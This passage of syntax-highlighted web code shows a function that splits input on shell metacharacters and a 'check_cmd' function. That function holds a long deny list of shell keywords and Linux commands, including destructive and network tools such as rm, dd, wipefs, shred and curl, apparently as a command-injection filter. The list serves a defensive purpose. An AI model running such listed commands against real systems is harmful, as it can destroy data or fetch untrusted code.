class="params">input, blackchr = [<span class="string">&quot;&amp;&amp;&quot;</span>, <span class="string">&quot;||&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;;&quot;</span>]</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">resultArray</span> = [];</span><br><span class="line">    let currentPart = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; input.length; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">currentChar</span> = input[i];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (blackchr.<span class="title function_ invoke__">includes</span>(currentChar)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (currentPart.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                resultArray.<span class="title function_ invoke__">push</span>(currentPart);</span><br><span class="line">                currentPart = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            currentPart += currentChar;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (currentPart.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        resultArray.<span class="title function_ invoke__">push</span>(currentPart);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> resultArray;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_cmd</span>(<span class="params">cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">command</span> = [<span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;&lt;&gt;&quot;</span>, <span class="string">&quot;`&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;if&quot;</span>, <span class="string">&quot;then&quot;</span>, <span class="string">&quot;else&quot;</span>, <span class="string">&quot;elif&quot;</span>, <span class="string">&quot;fi&quot;</span>, <span class="string">&quot;case&quot;</span>, <span class="string">&quot;esac&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;select&quot;</span>, <span class="string">&quot;while&quot;</span>, <span class="string">&quot;until&quot;</span>, <span class="string">&quot;do&quot;</span>, <span class="string">&quot;done&quot;</span>, <span class="string">&quot;in&quot;</span>, <span class="string">&quot;function&quot;</span>, <span class="string">&quot;time&quot;</span>, <span class="string">&quot;coproc&quot;</span>, <span class="string">&quot;alias&quot;</span>, <span class="string">&quot;bg&quot;</span>, <span class="string">&quot;bind&quot;</span>, <span class="string">&quot;break&quot;</span>, <span class="string">&quot;builtin&quot;</span>, <span class="string">&quot;caller&quot;</span>, <span class="string">&quot;cd&quot;</span>, <span class="string">&quot;command&quot;</span>, <span class="string">&quot;compgen&quot;</span>, <span class="string">&quot;complete&quot;</span>, <span class="string">&quot;compopt&quot;</span>, <span class="string">&quot;continue&quot;</span>, <span class="string">&quot;declare&quot;</span>, <span class="string">&quot;dirs&quot;</span>, <span class="string">&quot;disown&quot;</span>, <span class="string">&quot;echo&quot;</span>, <span class="string">&quot;enable&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;exit&quot;</span>, <span class="string">&quot;export&quot;</span>, <span class="string">&quot;false&quot;</span>, <span class="string">&quot;fc&quot;</span>, <span class="string">&quot;fg&quot;</span>, <span class="string">&quot;getopts&quot;</span>, <span class="string">&quot;hash&quot;</span>, <span class="string">&quot;help&quot;</span>, <span class="string">&quot;history&quot;</span>, <span class="string">&quot;jobs&quot;</span>, <span class="string">&quot;kill&quot;</span>, <span class="string">&quot;let&quot;</span>, <span class="string">&quot;local&quot;</span>, <span class="string">&quot;logout&quot;</span>, <span class="string">&quot;mapfile&quot;</span>, <span class="string">&quot;popd&quot;</span>, <span class="string">&quot;printf&quot;</span>, <span class="string">&quot;pushd&quot;</span>, <span class="string">&quot;pwd&quot;</span>, <span class="string">&quot;read&quot;</span>, <span class="string">&quot;readarray&quot;</span>, <span class="string">&quot;readonly&quot;</span>, <span class="string">&quot;return&quot;</span>, <span class="string">&quot;set&quot;</span>, <span class="string">&quot;shift&quot;</span>, <span class="string">&quot;shopt&quot;</span>, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;suspend&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;times&quot;</span>, <span class="string">&quot;trap&quot;</span>, <span class="string">&quot;true&quot;</span>, <span class="string">&quot;type&quot;</span>, <span class="string">&quot;typeset&quot;</span>, <span class="string">&quot;ulimit&quot;</span>, <span class="string">&quot;umask&quot;</span>, <span class="string">&quot;unalias&quot;</span>, <span class="string">&quot;unset&quot;</span>, <span class="string">&quot;wait&quot;</span>, <span class="string">&quot;vipw&quot;</span>, <span class="string">&quot;mkdumprd&quot;</span>, <span class="string">&quot;ifenslave&quot;</span>, <span class="string">&quot;fsck&quot;</span>, <span class="string">&quot;chpasswd&quot;</span>, <span class="string">&quot;useradd&quot;</span>, <span class="string">&quot;rtstat&quot;</span>, <span class="string">&quot;lnstat&quot;</span>, <span class="string">&quot;hwclock&quot;</span>, <span class="string">&quot;dhclient&quot;</span>, <span class="string">&quot;pwunconv&quot;</span>, <span class="string">&quot;groupmems&quot;</span>, <span class="string">&quot;mksquashfs&quot;</span>, <span class="string">&quot;chkconfig&quot;</span>, <span class="string">&quot;ethtool&quot;</span>, <span class="string">&quot;packer&quot;</span>, <span class="string">&quot;mkdict&quot;</span>, <span class="string">&quot;agetty&quot;</span>, <span class="string">&quot;applygnupgdefaults&quot;</span>, <span class="string">&quot;zramctl&quot;</span>, <span class="string">&quot;swaplabel&quot;</span>, <span class="string">&quot;blkzone&quot;</span>, <span class="string">&quot;pwconv&quot;</span>, <span class="string">&quot;cfdisk&quot;</span>, <span class="string">&quot;ldattach&quot;</span>, <span class="string">&quot;reboot&quot;</span>, <span class="string">&quot;tipc&quot;</span>, <span class="string">&quot;fstrim&quot;</span>, <span class="string">&quot;clockdiff&quot;</span>, <span class="string">&quot;groupadd&quot;</span>, <span class="string">&quot;dmfilemapd&quot;</span>, <span class="string">&quot;runuser&quot;</span>, <span class="string">&quot;modinfo&quot;</span>, <span class="string">&quot;swapoff&quot;</span>, <span class="string">&quot;telinit&quot;</span>, <span class="string">&quot;sfdisk&quot;</span>, <span class="string">&quot;ctstat&quot;</span>, <span class="string">&quot;clock&quot;</span>, <span class="string">&quot;rtpr&quot;</span>, <span class="string">&quot;fsfreeze&quot;</span>, <span class="string">&quot;ldconfig&quot;</span>, <span class="string">&quot;fdformat&quot;</span>, <span class="string">&quot;getcap&quot;</span>, <span class="string">&quot;kexec&quot;</span>, <span class="string">&quot;rdma&quot;</span>, <span class="string">&quot;tracepath&quot;</span>, <span class="string">&quot;rtmon&quot;</span>, <span class="string">&quot;rtacct&quot;</span>, <span class="string">&quot;fdisk&quot;</span>, <span class="string">&quot;udevadm&quot;</span>, <span class="string">&quot;usermod&quot;</span>, <span class="string">&quot;findfs&quot;</span>, <span class="string">&quot;halt&quot;</span>, <span class="string">&quot;resizepart&quot;</span>, <span class="string">&quot;routef&quot;</span>, <span class="string">&quot;genl&quot;</span>, <span class="string">&quot;mkswap&quot;</span>, <span class="string">&quot;poweroff&quot;</span>, <span class="string">&quot;rdisc&quot;</span>, <span class="string">&quot;grpunconv&quot;</span>, <span class="string">&quot;partx&quot;</span>, <span class="string">&quot;rtcwake&quot;</span>, <span class="string">&quot;nologin&quot;</span>, <span class="string">&quot;rfkill&quot;</span>, <span class="string">&quot;lspci&quot;</span>, <span class="string">&quot;vigr&quot;</span>, <span class="string">&quot;grpconv&quot;</span>, <span class="string">&quot;ip&quot;</span>, <span class="string">&quot;blkdeactivate&quot;</span>, <span class="string">&quot;addgnupghome&quot;</span>, <span class="string">&quot;chroot&quot;</span>, <span class="string">&quot;shutdown&quot;</span>, <span class="string">&quot;unsquashfs&quot;</span>, <span class="string">&quot;readprofile&quot;</span>, <span class="string">&quot;adduser&quot;</span>, <span class="string">&quot;groupmod&quot;</span>, <span class="string">&quot;ss&quot;</span>, <span class="string">&quot;dmstats&quot;</span>, <span class="string">&quot;ifcfg&quot;</span>, <span class="string">&quot;modprobe&quot;</span>, <span class="string">&quot;depmod&quot;</span>, <span class="string">&quot;iconvconfig&quot;</span>, <span class="string">&quot;sulogin&quot;</span>, <span class="string">&quot;rmmod&quot;</span>, <span class="string">&quot;grpck&quot;</span>, <span class="string">&quot;nstat&quot;</span>, <span class="string">&quot;ifstat&quot;</span>, <span class="string">&quot;sysctl&quot;</span>, <span class="string">&quot;insmod&quot;</span>, <span class="string">&quot;routel&quot;</span>, <span class="string">&quot;zdump&quot;</span>, <span class="string">&quot;blkdiscard&quot;</span>, <span class="string">&quot;getpcaps&quot;</span>, <span class="string">&quot;losetup&quot;</span>, <span class="string">&quot;setpci&quot;</span>, <span class="string">&quot;dmsetup&quot;</span>, <span class="string">&quot;wipefs&quot;</span>, <span class="string">&quot;addpart&quot;</span>, <span class="string">&quot;zic&quot;</span>, <span class="string">&quot;userdel&quot;</span>, <span class="string">&quot;makedumpfile&quot;</span>, <span class="string">&quot;blkid&quot;</span>, <span class="string">&quot;groupdel&quot;</span>, <span class="string">&quot;setcap&quot;</span>, <span class="string">&quot;chgpasswd&quot;</span>, <span class="string">&quot;resolvconf&quot;</span>, <span class="string">&quot;newusers&quot;</span>, <span class="string">&quot;init&quot;</span>, <span class="string">&quot;arping&quot;</span>, <span class="string">&quot;pwck&quot;</span>, <span class="string">&quot;devlink&quot;</span>, <span class="string">&quot;lsmod&quot;</span>, <span class="string">&quot;ping&quot;</span>, <span class="string">&quot;mkfs&quot;</span>, <span class="string">&quot;faillock&quot;</span>, <span class="string">&quot;runlevel&quot;</span>, <span class="string">&quot;blockdev&quot;</span>, <span class="string">&quot;swapon&quot;</span>, <span class="string">&quot;alternatives&quot;</span>, <span class="string">&quot;arpd&quot;</span>, <span class="string">&quot;delpart&quot;</span>, <span class="string">&quot;pidof&quot;</span>, <span class="string">&quot;chcpu&quot;</span>, <span class="string">&quot;capsh&quot;</span>, <span class="string">&quot;ctrlaltdel&quot;</span>, <span class="string">&quot;bridge&quot;</span>, <span class="string">&quot;less&quot;</span>, <span class="string">&quot;gpgsplit&quot;</span>, <span class="string">&quot;pgrep&quot;</span>, <span class="string">&quot;truncate&quot;</span>, <span class="string">&quot;localedef&quot;</span>, <span class="string">&quot;printf&quot;</span>, <span class="string">&quot;gencat&quot;</span>, <span class="string">&quot;sed&quot;</span>, <span class="string">&quot;ptx&quot;</span>, <span class="string">&quot;nm&quot;</span>, <span class="string">&quot;pwmake&quot;</span>, <span class="string">&quot;zmore&quot;</span>, <span class="string">&quot;tzselect&quot;</span>, <span class="string">&quot;script&quot;</span>, <span class="string">&quot;dnsdomainname&quot;</span>, <span class="string">&quot;ar&quot;</span>, <span class="string">&quot;more&quot;</span>, <span class="string">&quot;journalctl&quot;</span>, <span class="string">&quot;gunzip&quot;</span>, <span class="string">&quot;makedb&quot;</span>, <span class="string">&quot;tac&quot;</span>, <span class="string">&quot;col&quot;</span>, <span class="string">&quot;sync&quot;</span>, <span class="string">&quot;vi&quot;</span>, <span class="string">&quot;locale&quot;</span>, <span class="string">&quot;prlimit&quot;</span>, <span class="string">&quot;nisdomainname&quot;</span>, <span class="string">&quot;timedatectl&quot;</span>, <span class="string">&quot;ipcmk&quot;</span>, <span class="string">&quot;isosize&quot;</span>, <span class="string">&quot;free&quot;</span>, <span class="string">&quot;alias&quot;</span>, <span class="string">&quot;taskset&quot;</span>, <span class="string">&quot;factor&quot;</span>, <span class="string">&quot;pinky&quot;</span>, <span class="string">&quot;arch&quot;</span>, <span class="string">&quot;lscpu&quot;</span>, <span class="string">&quot;awk&quot;</span>, <span class="string">&quot;tty&quot;</span>, <span class="string">&quot;xmllint&quot;</span>, <span class="string">&quot;xzcmp&quot;</span>, <span class="string">&quot;readelf&quot;</span>, <span class="string">&quot;kdumpctl&quot;</span>, <span class="string">&quot;tsort&quot;</span>, <span class="string">&quot;nice&quot;</span>, <span class="string">&quot;cal&quot;</span>, <span class="string">&quot;rpmdb&quot;</span>, <span class="string">&quot;newgrp&quot;</span>, <span class="string">&quot;xmlwf&quot;</span>, <span class="string">&quot;slabtop&quot;</span>, <span class="string">&quot;utmpdump&quot;</span>, <span class="string">&quot;tar&quot;</span>, <span class="string">&quot;basename&quot;</span>, <span class="string">&quot;eject&quot;</span>, <span class="string">&quot;ranlib&quot;</span>, <span class="string">&quot;wall&quot;</span>, <span class="string">&quot;zless&quot;</span>, <span class="string">&quot;sort&quot;</span>, <span class="string">&quot;nsenter&quot;</span>, <span class="string">&quot;getent&quot;</span>, <span class="string">&quot;chrt&quot;</span>, <span class="string">&quot;mount&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;systemctl&quot;</span>, <span class="string">&quot;vmstat&quot;</span>, <span class="string">&quot;xmlcatalog&quot;</span>, <span class="string">&quot;date&quot;</span>, <span class="string">&quot;lsinitrd&quot;</span>, <span class="string">&quot;tload&quot;</span>, <span class="string">&quot;chmod&quot;</span>, <span class="string">&quot;setsid&quot;</span>, <span class="string">&quot;getopts&quot;</span>, <span class="string">&quot;colcrt&quot;</span>, <span class="string">&quot;su&quot;</span>, <span class="string">&quot;lsipc&quot;</span>, <span class="string">&quot;login&quot;</span>, <span class="string">&quot;lsns&quot;</span>, <span class="string">&quot;unalias&quot;</span>, <span class="string">&quot;lastb&quot;</span>, <span class="string">&quot;df&quot;</span>, <span class="string">&quot;gpg&quot;</span>, <span class="string">&quot;type&quot;</span>, <span class="string">&quot;gpgv&quot;</span>, <span class="string">&quot;pathchk&quot;</span>, <span class="string">&quot;groups&quot;</span>, <span class="string">&quot;lsmem&quot;</span>, <span class="string">&quot;users&quot;</span>, <span class="string">&quot;as&quot;</span>, <span class="string">&quot;ipcs&quot;</span>, <span class="string">&quot;jobs&quot;</span>, <span class="string">&quot;command&quot;</span>, <span class="string">&quot;iconv&quot;</span>, <span class="string">&quot;dwp&quot;</span>, <span class="string">&quot;domainname&quot;</span>, <span class="string">&quot;xzcat&quot;</span>, <span class="string">&quot;ldd&quot;</span>, <span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;strip&quot;</span>, <span class="string">&quot;dircolors&quot;</span>, <span class="string">&quot;nl&quot;</span>, <span class="string">&quot;trust&quot;</span>, <span class="string">&quot;stty&quot;</span>, <span class="string">&quot;ul&quot;</span>, <span class="string">&quot;chacl&quot;</span>, <span class="string">&quot;loginctl&quot;</span>, <span class="string">&quot;gzip&quot;</span>, <span class="string">&quot;xzmore&quot;</span>, <span class="string">&quot;zcat&quot;</span>, <span class="string">&quot;busctl&quot;</span>, <span class="string">&quot;fincore&quot;</span>, <span class="string">&quot;fgrep&quot;</span>, <span class="string">&quot;dmesg&quot;</span>, <span class="string">&quot;rm&quot;</span>, <span class="string">&quot;mv&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;lslogins&quot;</span>, <span class="string">&quot;numfmt&quot;</span>, <span class="string">&quot;flock&quot;</span>, <span class="string">&quot;realpath&quot;</span>, <span class="string">&quot;find&quot;</span>, <span class="string">&quot;tracepath&quot;</span>, <span class="string">&quot;lesskey&quot;</span>, <span class="string">&quot;printenv&quot;</span>, <span class="string">&quot;du&quot;</span>, <span class="string">&quot;grep&quot;</span>, <span class="string">&quot;udevadm&quot;</span>, <span class="string">&quot;tee&quot;</span>, <span class="string">&quot;rename&quot;</span>, <span class="string">&quot;gawk&quot;</span>, <span class="string">&quot;mkdir&quot;</span>, <span class="string">&quot;sg&quot;</span>, <span class="string">&quot;xzegrep&quot;</span>, <span class="string">&quot;xzdec&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;whereis&quot;</span>, <span class="string">&quot;strings&quot;</span>, <span class="string">&quot;setfacl&quot;</span>, <span class="string">&quot;mkfifo&quot;</span>, <span class="string">&quot;chage&quot;</span>, <span class="string">&quot;xzgrep&quot;</span>, <span class="string">&quot;kill&quot;</span>, <span class="string">&quot;rvi&quot;</span>, <span class="string">&quot;size&quot;</span>, <span class="string">&quot;ypdomainname&quot;</span>, <span class="string">&quot;tr&quot;</span>, <span class="string">&quot;umount&quot;</span>, <span class="string">&quot;rev&quot;</span>, <span class="string">&quot;wdctl&quot;</span>, <span class="string">&quot;uniq&quot;</span>, <span class="string">&quot;ps&quot;</span>, <span class="string">&quot;stdbuf&quot;</span>, <span class="string">&quot;chgrp&quot;</span>, <span class="string">&quot;setarch&quot;</span>, <span class="string">&quot;cd&quot;</span>, <span class="string">&quot;dirmngr&quot;</span>, <span class="string">&quot;write&quot;</span>, <span class="string">&quot;lastlog&quot;</span>, <span class="string">&quot;gsettings&quot;</span>, <span class="string">&quot;ex&quot;</span>, <span class="string">&quot;ipcrm&quot;</span>, <span class="string">&quot;cp&quot;</span>, <span class="string">&quot;fallocate&quot;</span>, <span class="string">&quot;colrm&quot;</span>, <span class="string">&quot;rpm&quot;</span>, <span class="string">&quot;pwdx&quot;</span>, <span class="string">&quot;xargs&quot;</span>, <span class="string">&quot;objdump&quot;</span>, <span class="string">&quot;ld&quot;</span>, <span class="string">&quot;chcon&quot;</span>, <span class="string">&quot;skill&quot;</span>, <span class="string">&quot;yum&quot;</span>, <span class="string">&quot;who&quot;</span>, <span class="string">&quot;gapplication&quot;</span>, <span class="string">&quot;stat&quot;</span>, <span class="string">&quot;sleep&quot;</span>, <span class="string">&quot;wait&quot;</span>, <span class="string">&quot;fg&quot;</span>, <span class="string">&quot;uuidgen&quot;</span>, <span class="string">&quot;logger&quot;</span>, <span class="string">&quot;pwscore&quot;</span>, <span class="string">&quot;xz&quot;</span>, <span class="string">&quot;mesg&quot;</span>, <span class="string">&quot;rmdir&quot;</span>, <span class="string">&quot;zgrep&quot;</span>, <span class="string">&quot;chmem&quot;</span>, <span class="string">&quot;newuidmap&quot;</span>, <span class="string">&quot;evmctl&quot;</span>, <span class="string">&quot;wc&quot;</span>, <span class="string">&quot;top&quot;</span>, <span class="string">&quot;egrep&quot;</span>, <span class="string">&quot;fold&quot;</span>, <span class="string">&quot;zfgrep&quot;</span>, <span class="string">&quot;link&quot;</span>, <span class="string">&quot;csplit&quot;</span>, <span class="string">&quot;sum&quot;</span>, <span class="string">&quot;expand&quot;</span>, <span class="string">&quot;getfacl&quot;</span>, <span class="string">&quot;newgidmap&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;install&quot;</span>, <span class="string">&quot;bootctl&quot;</span>, <span class="string">&quot;xzless&quot;</span>, <span class="string">&quot;runcon&quot;</span>, <span class="string">&quot;dirname&quot;</span>, <span class="string">&quot;comm&quot;</span>, <span class="string">&quot;false&quot;</span>, <span class="string">&quot;hostname&quot;</span>, <span class="string">&quot;unlink&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;ipcalc&quot;</span>, <span class="string">&quot;unexpand&quot;</span>, <span class="string">&quot;nohup&quot;</span>, <span class="string">&quot;zegrep&quot;</span>, <span class="string">&quot;head&quot;</span>, <span class="string">&quot;getopt&quot;</span>, <span class="string">&quot;raw&quot;</span>, <span class="string">&quot;hexdump&quot;</span>, <span class="string">&quot;mountpoint&quot;</span>, <span class="string">&quot;lslocks&quot;</span>, <span class="string">&quot;coreutils&quot;</span>, <span class="string">&quot;shred&quot;</span>, <span class="string">&quot;sotruss&quot;</span>, <span class="string">&quot;true&quot;</span>, <span class="string">&quot;pldd&quot;</span>, <span class="string">&quot;uuidparse&quot;</span>, <span class="string">&quot;localectl&quot;</span>, <span class="string">&quot;gtar&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;znew&quot;</span>, <span class="string">&quot;logname&quot;</span>, <span class="string">&quot;gzexe&quot;</span>, <span class="string">&quot;rpmquery&quot;</span>, <span class="string">&quot;touch&quot;</span>, <span class="string">&quot;hash&quot;</span>, <span class="string">&quot;cpio&quot;</span>, <span class="string">&quot;sprof&quot;</span>, <span class="string">&quot;hostnamectl&quot;</span>, <span class="string">&quot;uname&quot;</span>, <span class="string">&quot;unxz&quot;</span>, <span class="string">&quot;zdiff&quot;</span>, <span class="string">&quot;gdbus&quot;</span>, <span class="string">&quot;namei&quot;</span>, <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;kmod&quot;</span>, <span class="string">&quot;info&quot;</span>, <span class="string">&quot;umask&quot;</span>, <span class="string">&quot;zcmp&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="string">&quot;mktemp&quot;</span>, <span class="string">&quot;pwd&quot;</span>, <span class="string">&quot;column&quot;</span>, <span class="string">&quot;scriptreplay&quot;</span>, <span class="string">&quot;lessecho&quot;</span>, <span class="string">&quot;look&quot;</span>, <span class="string">&quot;setterm&quot;</span>, <span class="string">&quot;gdbmtool&quot;</span>, <span class="string">&quot;rpmkeys&quot;</span>, <span class="string">&quot;bg&quot;</span>, <span class="string">&quot;id&quot;</span>, <span class="string">&quot;gpasswd&quot;</span>, <span class="string">&quot;dracut&quot;</span>, <span class="string">&quot;vdir&quot;</span>, <span class="string">&quot;mcookie&quot;</span>, <span class="string">&quot;elfedit&quot;</span>, <span class="string">&quot;chown&quot;</span>, <span class="string">&quot;objcopy&quot;</span>, <span class="string">&quot;hostid&quot;</span>, <span class="string">&quot;shuf&quot;</span>, <span class="string">&quot;view&quot;</span>, <span class="string">&quot;mknod&quot;</span>, <span class="string">&quot;gpgparsemail&quot;</span>, <span class="string">&quot;fc&quot;</span>, <span class="string">&quot;tail&quot;</span>, <span class="string">&quot;zforce&quot;</span>, <span class="string">&quot;last&quot;</span>, <span class="string">&quot;dir&quot;</span>, <span class="string">&quot;ionice&quot;</span>, <span class="string">&quot;read&quot;</span>, <span class="string">&quot;resolvectl&quot;</span>, <span class="string">&quot;watchgnupg&quot;</span>, <span class="string">&quot;unshare&quot;</span>, <span class="string">&quot;timeout&quot;</span>, <span class="string">&quot;getconf&quot;</span>, <span class="string">&quot;findmnt&quot;</span>, <span class="string">&quot;pr&quot;</span>, <span class="string">&quot;xzfgrep&quot;</span>, <span class="string">&quot;ping&quot;</span>, <span class="string">&quot;rview&quot;</span>, <span class="string">&quot;fmt&quot;</span>, <span class="string">&quot;echo&quot;</span>, <span class="string">&quot;readlink&quot;</span>, <span class="string">&quot;dd&quot;</span>, <span class="string">&quot;paste&quot;</span>, <span class="string">&quot;od&quot;</span>, <span class="string">&quot;setpriv&quot;</span>, <span class="string">&quot;coredumpctl&quot;</span>, <span class="string">&quot;dnf&quot;</span>, <span class="string">&quot;xzdiff&quot;</span>, <span class="string">&quot;renicerpmverify&quot;</span>, <span class="string">&quot;pkill&quot;</span>, <span class="string">&quot;mkinitrd&quot;</span>, <span class="string">&quot;pmap&quot;</span>, <span class="string">&quot;snice&quot;</span>, <span class="string">&quot;gio&quot;</span>, <span class="string">&quot;gpgconf&quot;</span>, <span class="string">&quot;expr&quot;</span>, <span class="string">&quot;ulimit&quot;</span>, <span class="string">&quot;nproc&quot;</span>, <span class="string">&quot;pidof&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;cksum&quot;</span>, <span class="string">&quot;yes&quot;</span>, <span class="string">&quot;rpmverify&quot;</span>, <span class="string">&quot;lsblk&quot;</span>, <span class="string">&quot;catchsegv&quot;</span>, <span class="string">&quot;uptime&quot;</span>, <span class="string">&quot;seq&quot;</span>, <span class="string">&quot;ln&quot;</span>, <span class="string">&quot;cut&quot;</span>, <span class="string">&quot;bashbug&quot;</span>, <span class="string">&quot;curl&quot;</span>, <span class="string">&quot;gprof&quot;</span>, <span class="string">&quot;node&quot;</span>, <span class="string">&quot;npm&quot;</span>, <span class="string">&quot;corepack&quot;</span>, <span class="string">&quot;npx&quot;</span>, <span class="string">&quot;vipw&quot;</span>, <span class="string">&quot;mkdumprd&quot;</span>, <span class="string">&quot;ifenslave&quot;</span>, <span class="string">&quot;fsck&quot;</span>, <span class="string">&quot;chpasswd&quot;</span>, <span class="string">&quot;useradd&quot;</span>, <span class="string">&quot;rtstat&quot;</span>, <span class="string">&quot;lnstat&quot;</span>, <span class="string">&quot;hwclock&quot;</span>, <span class="string">&quot;dhclient&quot;</span>, <span class="string">&quot;pwunconv&quot;</span>, <span class="string">&quot;groupmems&quot;</span>, <span class="string">&quot;mksquashfs&quot;</span>, <span class="string">&quot;chkconfig&quot;</span>, <span class="string">&quot;ethtool&quot;</span>, <span class="string">&quot;packer&quot;</span>, <span class="string">&quot;mkdict&quot;</span>, <span class="string">&quot;agetty&quot;</span>, <span class="string">&quot;applygnupgdefaults&quot;</span>, <span class="string">&quot;zramctl&quot;</span>, <span class="string">&quot;swaplabel&quot;</span>, <span class="string">&quot;blkzone&quot;</span>, <span class="string">&quot;pwconv&quot;</span>, <span class="string">&quot;cfdisk&quot;</span>, <span class="string">&quot;ldattach&quot;</span>, <span class="string">&quot;reboot&quot;</span>, <span class="string">&quot;tipc&quot;</span>, <span class="string">&quot;fstrim&quot;</span>, <span class="string">&quot;clockdiff&quot;</span>, <span class="string">&quot;groupadd&quot;</span>, <span class="string">&quot;dmfilemapd&quot;</span>, <span class="string">&quot;runuser&quot;</span>, <span class="string">&quot;modinfo&quot;</span>, <span class="string">&quot;swapoff&quot;</span>, <span class="string">&quot;telinit&quot;</span>, <span class="string">&quot;sfdisk&quot;</span>, <span class="string">&quot;ctstat&quot;</span>, <span class="string">&quot;clock&quot;</span>, <span class="string">&quot;rtpr&quot;</span>, <span class="string">&quot;fsfreeze&quot;</span>, <span class="string">&quot;ldconfig&quot;</span>, <span class="string">&quot;fdformat&quot;</span>, <span class="string">&quot;getcap&quot;</span>, <span class="string">&quot;kexec&quot;</span>, <span class="string">&quot;rdma&quot;</span>, <span class="string">&quot;tracepath&quot;</span>, <span class="string">&quot;rtmon&quot;</span>, <span class="string">&quot;rtacct&quot;</span>, <span class="string">&quot;fdisk&quot;</span>, <span class="string">&quot;udevadm&quot;</span>, <span class="string">&quot;usermod&quot;</span>, <span class="string">&quot;findfs&quot;</span>, <span class="string">&quot;halt&quot;</span>, <span class="string">&quot;resizepart&quot;</span>, <span class="string">&quot;routef&quot;</span>, <span class="string">&quot;genl&quot;</span>, <span class="string">&quot;mkswap&quot;</span>, <span class="string">&quot;poweroff&quot;</span>, <span class="string">&quot;rdisc&quot;</span>, <span class="string">&quot;grpunconv&quot;</span>, <span class="string">&quot;partx&quot;</span>, <span class="string">&quot;rtcwake&quot;</span>, <span class="string">&quot;nologin&quot;</span>, <span class="string">&quot;rfkill&quot;</span>, <span class="string">&quot;lspci&quot;</span>, <span class="string">&quot;vigr&quot;</span>, <span class="string">&quot;grpconv&quot;</span>, <span class="string">&quot;ip&quot;</span>, <span class="string">&quot;blkdeactivate&quot;</span>, <span class="string">&quot;addgnupghome&quot;</span>, <span class="string">&quot;chroot&quot;</span>, <span class="string">&quot;shutdown&quot;</span>, <span class="string">&quot;unsquashfs&quot;</span>, <span class="string">&quot;readprofile&quot;</span>, <span class="string">&quot;adduser&quot;</span>, <span class="string">&quot;groupmod&quot;</span>, <span class="string">&quot;ss&quot;</span>, <span class="string">&quot;dmstats&quot;</span>, <span class="string">&quot;ifcfg&quot;</span>, <span class="string">&quot;modprobe&quot;</span>, <span class="string">&quot;depmod&quot;</span>, <span class="string">&quot;iconvconfig&quot;</span>, <span class="string">&quot;sulogin&quot;</span>, <span class="string">&quot;rmmod&quot;</span>, <span class="string">&quot;grpck&quot;</span>, <span class="string">&quot;nstat&quot;</span>, <span class="string">&quot;ifstat&quot;</span>, <span class="string">&quot;sysctl&quot;</span>, <span class="string">&quot;insmod&quot;</span>, <span class="string">&quot;routel&quot;</span>, <span class="string">&quot;zdump&quot;</span>, <span class="string">&quot;blkdiscard&quot;</span>, <span class="string">&quot;getpcaps&quot;</span>, <span class="string">&quot;losetup&quot;</span>, <span class="string">&quot;setpci&quot;</span>, <span class="string">&quot;dmsetup&quot;</span>, <span class="string">&quot;wipefs&quot;</span>, <span class="string">&quot;addpart&quot;</span>, <span class="string">&quot;zic&quot;</span>, <span class="string">&quot;userdel&quot;</span>, <span class="string">&quot;makedumpfile&quot;</span>, <span class="string">&quot;blkid&quot;</span>, <span class="string">&quot;groupdel&quot;</span>, <span class="string">&quot;setcap&quot;</span>, <span class="string">&quot;chgpasswd&quot;</span>, <span class="string">&quot;resolvconf&quot;</span>, <span class="string">&quot;newusers&quot;</span>, <span class="string">&quot;init&quot;</span>, <span class="string">&quot;arping&quot;</span>, <span class="string">&quot;pwck&quot;</span>, <span class="string">&quot;devlink&quot;</span>, <span class="string">&quot;lsmod&quot;</span>, <span class="string">&quot;ping&quot;</span>, <span class="string">&quot;mkfs&quot;</span>, <span class="string">&quot;faillock&quot;</span>, <span class="string">&quot;runlevel&quot;</span>, <span class="string">&quot;blockdev&quot;</span>, <span class="string">&quot;swapon&quot;</span>, <span class="string">&quot;alternatives&quot;</span>, <span 